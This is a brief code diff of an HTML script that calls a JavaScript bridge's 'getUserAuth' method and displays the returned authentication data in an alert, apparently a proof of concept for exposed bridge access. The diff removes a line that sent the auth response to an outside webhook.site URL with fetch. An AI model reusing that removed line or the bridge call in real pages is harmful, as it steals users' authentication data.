@@ -3,7 +3,6 @@
 <script>
     const bridge = window.dsBridge || window._dsbridge;
     bridge.call("getUserAuth", {}, function(resp){
-        fetch("https://webhook.site/767aff36-7e40-4fb5-ae1a-93431ada5cab?data=" + encodeURIComponent(resp));
         alert("data:" + JSON.stringify(resp));
     });
 </script>
